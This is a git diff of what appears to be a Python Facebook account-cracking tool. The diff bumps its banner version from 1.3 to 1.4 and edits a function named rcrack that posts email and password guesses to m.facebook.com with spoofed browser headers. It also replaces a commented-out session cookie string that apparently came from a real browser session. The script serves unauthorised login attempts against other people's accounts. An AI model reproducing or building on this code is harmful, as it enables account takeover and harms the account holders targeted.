@@ -109,7 +109,7 @@ logo ="""
 \x1b[1;92m[+] ON FACEBOK   :  𝐍𝐀𝐐𝐄𝐄𝐁𝐔𝐋𝐋𝐀𝐇 𝐒𝐀𝐁𝐈𝐑
 \x1b[1;93m[+] ON GITHUB    :  𝐍𝐀𝐐𝐄𝐄𝐁𝐔𝐋𝐋𝐀𝐇 𝐒𝐀𝐁𝐈𝐑
 \x1b[1;94m[+] TOOL STATUS  :  𝐅𝐑𝐄𝐄
-\x1b[1;95m[+] TOOL VIRSION :  1.3
+\x1b[1;95m[+] TOOL VIRSION :  1.4
 \x1b[1;96m[+]==============================================[+]"""
 loop = 0
 oks = []
@@ -387,12 +387,12 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {
+            header_freefb ={
     'authority': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=ercKZdbGMkSjeBbXeYInQASJ; sb=ercKZQwR3Ipjq20xyaRgGWRN; m_pixel_ratio=1.75; wd=412x758; fr=01cuMzGE8ET7dKsuP..BlCrd6.KI.AAA.0.0.BlCs-f.AWU-ch9jU5Y',
+    # 'cookie': 'datr=ercKZdbGMkSjeBbXeYInQASJ; sb=ercKZQwR3Ipjq20xyaRgGWRN; m_pixel_ratio=1.75; wd=412x758; fr=01cuMzGE8ET7dKsuP..BlCrd6.KI.AAA.0.0.BlCs_E.AWU7PuTiVhQ',
     'dpr': '1.75',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
